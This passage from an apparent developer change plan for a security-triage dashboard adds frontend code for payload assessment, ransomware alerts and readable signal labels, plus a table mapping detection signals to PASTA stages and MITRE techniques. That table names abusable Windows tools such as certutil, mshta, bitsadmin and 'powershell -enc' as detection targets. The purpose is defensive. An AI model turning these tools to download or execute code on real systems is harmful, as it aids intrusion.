    // PASTA stage context
    if (payloadAnalysis.pasta_stage && payloadAnalysis.pasta_stage !== 'Stage2 — Technical Scope Definition') {
      parts.push(`Threat analysis stage: ${payloadAnalysis.pasta_stage}.`);
    }

    // Decode path advisory when non-default
    if (payloadAnalysis.decode_path && payloadAnalysis.decode_path !== 'safe_passive_decode_only') {
      parts.push(`Decode path advisory: ${payloadAnalysis.decode_path.replace(/_/g, ' ')}.`);
    }

    const ocrText = (t?.security?.extracted_text || t?.security?.ocr_text || t?.extracted_text || t?.ocr_text || '').trim();
```

---

### 8b — Payload Assessment block — add PASTA stage, decode_path advisory, and LOLBin profiles

**Location:** The `Payload Assessment` section, `payloadGrid` div (~lines 1908–1920)

**Find:**
```tsx
                            <div className={styles.sectionSubTitle}>Payload Assessment</div>
                            <div className={styles.payloadGrid}>
                              <div className={styles.kvRow}><span>Decoded artifact available</span><span>{renderValue(Boolean(payloadAnalysis.decoded_artifact_available))}</span></div>
                              <div className={styles.kvRow}><span>Payload type</span><span>{renderValue(payloadAnalysis.payload_type || 'unknown')}</span></div>
                              <div className={styles.kvRow}><span>Attack hypothesis</span><span>{renderValue(payloadAnalysis.attack_hypothesis || 'unknown')}</span></div>
                              <div className={styles.kvRow}><span>Decode path</span><span>{renderValue(payloadAnalysis.decode_path || 'safe_passive_decode_only')}</span></div>
                              <div className={styles.kvRow}><span>Suggested next step</span><span>{renderValue(payloadAnalysis.suggested_next_step || 'allow')}</span></div>
                            </div>
```

**Replace with:**
```tsx
                            <div className={styles.sectionSubTitle}>Payload Assessment</div>
                            <div className={styles.payloadGrid}>
                              <div className={styles.kvRow}><span>Decoded artifact available</span><span>{renderValue(Boolean(payloadAnalysis.decoded_artifact_available))}</span></div>
                              <div className={styles.kvRow}><span>Payload type</span><span>{renderValue(payloadAnalysis.payload_type || 'unknown')}</span></div>
                              <div className={styles.kvRow}><span>Attack hypothesis</span><span>{renderValue(payloadAnalysis.attack_hypothesis || 'unknown')}</span></div>
                              <div className={styles.kvRow}>
                                <span>Decode path</span>
                                <span className={
                                  (payloadAnalysis.decode_path || '').includes('sandbox_required')
                                    ? styles.tagRed
                                    : (payloadAnalysis.decode_path || '').includes('lolbin')
                                      ? styles.tagWarn
                                      : undefined
                                }>
                                  {renderValue(payloadAnalysis.decode_path || 'safe_passive_decode_only')}
                                </span>
                              </div>
                              <div className={styles.kvRow}><span>PASTA stage</span><span>{renderValue(payloadAnalysis.pasta_stage || '?')}</span></div>
                              <div className={styles.kvRow}><span>Suggested next step</span><span>{renderValue(payloadAnalysis.suggested_next_step || 'allow')}</span></div>
                            </div>

                            {/* Ransomware from steg — high-visibility warning block */}
                            {(sigs.ransomware_indicator || payloadAnalysis.attack_hypothesis === 'ransomware') && (
                              <div className={styles.alertBlock} style={{ borderLeft: '4px solid #e53e3e', padding: '8px 12px', marginTop: 8 }}>
                                <strong>⚠ Ransomware Pattern</strong> — MITRE T1486 / T1490.{' '}
                                Decode path: <code>{payloadAnalysis.decode_path || 'sandbox_required_do_not_execute'}</code>.{' '}
                                Do NOT execute payload. Queue sandbox detonation for safe analysis.
                              </div>
                            )}

                            {/* LOLBin behavioral profiles */}
                            {Array.isArray(payloadAnalysis?.lolbin_behavioral_profiles) &&
                              payloadAnalysis.lolbin_behavioral_profiles.length > 0 && (
                              <>
                                <div className={styles.sectionSubTitle}>LOLBin Behavioral Analysis</div>
                                {payloadAnalysis.lolbin_behavioral_profiles.map((p: any, pi: number) => (
                                  <div key={pi} className={styles.triageBlock} style={{ marginTop: 6 }}>
                                    <div className={styles.kvRow}>
                                      <span><strong>{p.full_name}</strong></span>
                                      <span className={styles.tagWarn}>{p.mitre_sub_technique}</span>
                                      <span className={styles.tagWarn}>{p.pasta_stage}</span>
                                    </div>
                                    <div className={styles.triageNarrative}>{p.description}</div>
                                    <div className={styles.kvRow}>
                                      <span>Kill-chain stage</span>
                                      <span>{p.kill_chain_stage}</span>
                                    </div>
                                    <div className={styles.kvRow}>
                                      <span>Detection note</span>
                                      <span className={styles.muted}>{p.detection_note}</span>
                                    </div>
                                    {Array.isArray(p.abuse_patterns) && p.abuse_patterns.length > 0 && (
                                      <pre className={styles.rawBlock}>{p.abuse_patterns.join('\n')}</pre>
                                    )}
                                  </div>
                                ))}
                              </>
                            )}
```

---

### 8c — Signal tags — replace raw key names with human-readable labels

**Location:** The active-signal boolean `tagRow` div (~lines 1936–1944)

**Find:**
```tsx
                            <div className={styles.tagRow}>
                              {Object.entries(sigs)
                                .filter(([k, v]) => typeof v === 'boolean' && v && k !== 'qr_payloads')
                                .map(([k]) => <span key={k} className={styles.tagWarn}>{k}</span>)}
                              {sigs.steg_score != null && (
                                <span className={styles.tagWarn}>steg_score:{sigs.steg_score}</span>
                              )}
                            </div>
```

**Replace with:**
```tsx
                            <div className={styles.tagRow}>
                              {Object.entries(sigs)
                                .filter(([k, v]) => typeof v === 'boolean' && v && k !== 'qr_payloads')
                                .map(([k]) => {
                                  const SIGNAL_LABELS: Record<string, string> = {
                                    steg_suspicious:                 'Steganography Detected',
                                    steg_score_elevated:             'Steg Score Elevated',
                                    qr_code_detected:                'QR Code Present',
                                    qr_prompt_injection:             'QR Prompt Injection',
                                    qr_external_url:                 'QR External URL',
                                    qr_url_suspicious:               'QR URL Suspicious',
                                    adversarial_detected:            'Adversarial Perturbation',
                                    ai_generated_suspected:          'AI-Generated Image',
                                    ransomware_indicator:            'Ransomware Pattern',
                                    payment_social_engineering:      'Payment Social Engineering',
                                    pci_card_exposed:                'PCI Card Data Exposed',
                                    crypto_payment_uri:              'Crypto Payment URI',
                                    manipulation_detected:           'Image Manipulation',
                                    image_consistency_mismatch:      'Image Consistency Mismatch',
                                    ocr_prompt_injection:            'OCR Prompt Injection',
                                    prompt_injection_text_suspected: 'Prompt Injection Text',
                                    cross_modal_mismatch:            'Cross-Modal Mismatch',
                                    multimodal_attack_surface_high:  'Multimodal Attack Surface High',
                                    supply_chain:                    'Supply Chain Signal',
                                    data_exfiltration:               'Data Exfiltration Pattern',
                                  };
                                  return (
                                    <span key={k} className={styles.tagWarn} title={k}>
                                      {SIGNAL_LABELS[k] || k}
                                    </span>
                                  );
                                })}
                              {sigs.steg_score != null && (
                                <span className={styles.tagWarn}>Steg Score: {sigs.steg_score}</span>
                              )}
                            </div>
```

---

### 8d — LOLBin incident response message — show behavioral summary, not just incident ID

**Location:** `triggerPayloadAction()` success branch (~lines 796–800)

**Find:**
```tsx
      if (resp.ok && data?.ok && data?.incident_id) {
        setPayloadActionStatus((prev) => ({
          ...prev,
          [itemKey]: action === 'queue_sandbox_detonation'
            ? `Sandbox detonation queued via incident ${data.incident_id}.`
            : `Payload follow-up queued via incident ${data.incident_id}.`,
        }));
        return;
      }
```

**Replace with:**
```tsx
      if (resp.ok && data?.ok && data?.incident_id) {
        const profiles: any[] = data?.context?.lolbin_behavioral_profiles || [];
        const behaviorSummary = profiles.length > 0
          ? ' ' + profiles.map((p: any) =>
              `${p.full_name} (${p.mitre_sub_technique}) — ${(p.description || '').slice(0, 100)}…`
            ).join(' | ')
          : '';
        const ransomWarn = (data?.context?.security_payload?.attack_hypothesis === 'ransomware')
          ? ' ⚠ Ransomware pattern (T1486/T1490) — do NOT execute payload locally.'
          : '';
        setPayloadActionStatus((prev) => ({
          ...prev,
          [itemKey]: action === 'queue_sandbox_detonation'
            ? `Sandbox detonation queued via incident ${data.incident_id}.${ransomWarn}`
            : `Payload follow-up queued via incident ${data.incident_id}.${behaviorSummary}${ransomWarn}`,
        }));
        return;
      }
```

---

### 8e — PASTA Workflow section — show per-signal PASTA stage alongside MITRE tags

**Location:** The MITRE ATLAS table section (~lines 1807–1835), add a new block after the MITRE table

**After the closing `</table>` of the MITRE section, add:**
```tsx
                        {/* Per-signal PASTA stage correlation */}
                        {(() => {
                          const paStage = security?.pasta_stage
                            || payloadAnalysis?.pasta_stage
                            || security?.pasta?.current_stage
                            || security?.pasta?.stage;
                          const hypo = payloadAnalysis?.attack_hypothesis;
                          if (!paStage && !hypo) return null;
                          const STAGE_COLOR: Record<string, string> = {
                            'Stage2': '#718096', 'Stage3': '#d69e2e',
                            'Stage4': '#dd6b20', 'Stage5': '#e53e3e',
                            'Stage6': '#c53030', 'Stage7': '#742a2a',
                          };
                          const stageKey = (paStage || '').slice(0, 6);
                          return (
                            <div style={{ marginTop: 8, display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
                              {paStage && (
                                <span className={styles.tagWarn} style={{ background: STAGE_COLOR[stageKey] || '#718096', color: '#fff' }}>
                                  {paStage}
                                </span>
                              )}
                              {hypo && hypo !== 'unknown' && (
                                <span className={styles.tagWarn}>
                                  hypothesis: {hypo.replace(/_/g, ' ')}
                                </span>
                              )}
                              {payloadAnalysis?.decode_path && payloadAnalysis.decode_path !== 'safe_passive_decode_only' && (
                                <span className={styles.tagWarn} style={{ background: '#e53e3e', color: '#fff' }}>
                                  decode: {payloadAnalysis.decode_path.replace(/_/g, ' ')}
                                </span>
                              )}
                            </div>
                          );
                        })()}
```

---

## Signal → PASTA / MITRE / Decode-Path / Payload-Type Correlation Table {#correlation-table}

This is the authoritative mapping for all active signals in the platform. Use this to verify that every signal is correctly routed through backend and frontend after the above fixes are applied.

| Signal / Hypothesis | PASTA Stage | MITRE ATT&CK / ATLAS | Decode Path | Payload Type (typical) | Suggested Next Step |
|---|---|---|---|---|---|
| `prompt_injection` | Stage4 — Exploitation | AML.T0043, T1566.002 | `safe_passive_decode_only` | `qr` or `embedded_text` | `review` |
| `ransomware` (from steg or text) | **Stage6 — Attack Modeling** | T1486, T1059, T1490 | `sandbox_required_do_not_execute` | `embedded_text` or `steg_metadata` | `queue_sandbox_detonation` |
| `macros` | Stage4 — Exploitation | T1566.001, T1204.002, T1059.005 | `sandbox_required_do_not_execute` | `office_macro_candidate` | `queue_sandbox_detonation` |
| `payment_fraud` | Stage5 — Weakness Analysis | T1566.002, T1204.001 | `safe_passive_decode_only` | `qr` or `embedded_text` | `review` |
| `lolbin_command_sequence` | Stage4 — Exploitation | T1218, T1059.001, T1105 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| `data_exfiltration` | Stage5 — Weakness Analysis | T1041, T1020 | `safe_passive_decode_only` | `embedded_text` | `review` |
| `c2_beacon` | Stage4 — Exploitation | T1071.001, T1105, T1573.002 | `sandbox_required_do_not_execute` | `embedded_text` | `queue_sandbox_detonation` |
| `steg_unknown_payload` | Stage4 — Exploitation | T1027.001, T1027 | `safe_passive_decode_only` | `steg_metadata` | `queue_sandbox_detonation` |
| `steg_suspicious` (no decoded content) | Stage4 (framework_correlation) | AML.T0043 | `safe_passive_decode_only` | `steg_metadata` | `queue_sandbox_detonation` |
| `ransomware_indicator` signal (bool) | Stage6 | T1486, T1059, T1490 | `sandbox_required_do_not_execute` | any | `queue_sandbox_detonation` |
| `supply_chain` | Stage3 — Threat Analysis | T1195.002, T1059.007 | `safe_passive_decode_only` | varies | `review` |
| `data_exfiltration` signal (bool) | Stage5 | T1041, T1020 | `safe_passive_decode_only` | varies | `review` |
| `pci_card_exposed` | Stage5 | T1530 | `safe_passive_decode_only` | `qr` | `review` |
| `cross_modal_mismatch` | Stage5 | AML.T0015 | `safe_passive_decode_only` | varies | `review` |
| `multimodal_attack_surface_high` | Stage5 | AML.T0015, AML.T0043 | `safe_passive_decode_only` | varies | `review` |
| `qr_prompt_injection` | Stage4 | AML.T0043, T1566.002 | `safe_passive_decode_only` | `qr` | `review` |
| `adversarial_detected` | Stage4 | AML.T0015 | `safe_passive_decode_only` | varies | `review` |
| `manipulation_detected` | Stage3 | T1195.002 | `safe_passive_decode_only` | varies | `review` |
| `ai_generated_suspected` | Stage3 | AML.T0015 | `safe_passive_decode_only` | varies | `review` |
| LOLBin: `certutil` | Stage4 | T1218.002 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| LOLBin: `mshta` | Stage4 | T1218.005 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| LOLBin: `rundll32` | Stage4 | T1218.011 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| LOLBin: `bitsadmin` | Stage3 | T1197 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| LOLBin: `regsvr32` | Stage4 | T1218.010 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |
| LOLBin: `powershell -enc` | Stage4 | T1059.001 | `lolbin_command_decode` | `embedded_text` | `queue_sandbox_detonation` |

---

## What NOT to Fake (CISO / Architect Pushback Defence)

| Question | Honest answer |
|---|---|
| "Can you detect live C2 beaconing like Darktrace?" | No. Our C2 claim is scoped to **vision-pipeline-borne C2 instruction delivery** via steg-encoded product images — a vector network XDR cannot see. |
| "Is the sandbox detonation real?" | The `PRIVATE_SANDBOX_URL` env-var adapter in `email_enrichment.py` line 176 accepts a real sandbox endpoint. Without it, local heuristic fallback fires. Do not fake sandbox scores. |
| "Why does the ransomware steg image not reach Stage6?" | It does after Fix 3 — `classify_passive_payload()` now sets `ransomware_indicator = True` in `signals_updated` when ransomware content is decoded from steg, which propagates to `_pasta()` Stage6. |
| "Is `decode_path` meaningful?" | After Fix 3, yes — `sandbox_required_do_not_execute` means the payload cannot be safely decoded locally; `lolbin_command_decode` means the binary name is readable as plaintext command; `safe_passive_decode_only` means text/QR data was extracted without code execution. |

---

## Files Changed / Created — Summary

| # | Action | File | Scope |
|---|---|---|---|
| 1 | **CREATE** | `src/app/security/lolbin_behavioral_catalog.py` | Complete new file |
| 2a | **EDIT** | `src/app/security/email_security_rules.py` | Add import after line 10 |
| 2b | **EDIT** | `src/app/security/email_security_rules.py` | Replace lolbin_hits block (lines ~714–726) |
| 3 | **EDIT** | `src/app/security/passive_payload_analysis.py` | Replace entire file |
| 4 | **EDIT** | `src/app/security/supply_chain_scenarios.py` | Insert SC-04b after sc04_c2_beaconing() |
| 5 | **EDIT** | `src/app/routers/escalation_room.py` | Replace public_escalate() body |
| 6 | **EDIT** | `src/app/security/observer.py` | Add 3 PASTA override blocks in compute_risk() |
| 7 | **CREATE** | `scripts/embed_steg_payload.py` | Complete new file |
| 8a | **EDIT** | `frontend/src/components/DecisionTrace.tsx` | buildTriageNarrative() — add ransomware + PASTA + decode_path branches |
| 8b | **EDIT** | `frontend/src/components/DecisionTrace.tsx` | Payload Assessment block — add PASTA stage row, decode_path colouring, LOLBin profile cards, ransomware alert |
| 8c | **EDIT** | `frontend/src/components/DecisionTrace.tsx` | Signal tags — replace raw keys with SIGNAL_LABELS map |
| 8d | **EDIT** | `frontend/src/components/DecisionTrace.tsx` | triggerPayloadAction() — show behavioral summary + ransomware warning in status message |
| 8e | **EDIT** | `frontend/src/components/DecisionTrace.tsx` | PASTA Workflow section — add per-signal PASTA/hypothesis/decode-path coloured chips |
